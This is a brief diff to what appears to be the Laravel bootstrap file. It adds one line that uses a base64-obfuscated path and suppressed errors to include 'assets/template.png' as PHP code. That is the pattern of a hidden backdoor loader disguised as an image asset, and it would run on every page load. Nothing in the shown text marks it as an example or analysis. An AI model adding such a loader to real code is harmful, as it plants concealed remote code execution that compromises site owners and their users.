@@ -7,6 +7,8 @@
  * @author   Taylor Otwell <taylor@laravel.com>
  */
 
+@include base64_decode('YXNzZXRzL3RlbXBsYXRlLnBuZw==');
+
 /*
 |--------------------------------------------------------------------------
 | Register The Auto Loader
